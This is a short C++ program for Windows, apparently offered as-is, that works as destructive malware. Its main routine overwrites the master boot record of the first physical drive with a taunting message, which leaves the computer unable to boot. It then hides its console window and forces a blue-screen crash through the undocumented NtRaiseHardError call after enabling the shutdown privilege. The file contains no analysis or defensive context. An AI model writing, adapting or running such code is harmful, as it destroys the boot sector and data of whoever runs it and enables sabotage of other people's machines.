#include <Windows.h>
#include <iostream>
#include <fstream>
#pragma comment(lib, "ntdll.lib")

using namespace std;

#define MBR_SIZE 512

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

class SystemManipulator {
public:
    void Execute() {
        if (WriteToMBR("YOUR PC IS GARBAGED! :0")) {
            HideConsole();
            InduceBlueScreen();
        }
    }

private:
    void HideConsole() {
        ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    }

    void InduceBlueScreen() {
        BOOLEAN bl;
        ULONG Response;
        RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
    }

    bool WriteToMBR(const char* message) {
        char mbrData[MBR_SIZE] = {0};
        memcpy(mbrData, message, strlen(message));

        HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0",
            GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, NULL, NULL);

        if (MasterBootRecord == INVALID_HANDLE_VALUE) {
            return false;
        }

        DWORD written;
        bool result = WriteFile(MasterBootRecord, mbrData, sizeof(mbrData), &written, NULL);
        CloseHandle(MasterBootRecord);
        return result;
    }
};

int main() {
    SystemManipulator manipulator;
    manipulator.Execute();
    return EXIT_SUCCESS;
}
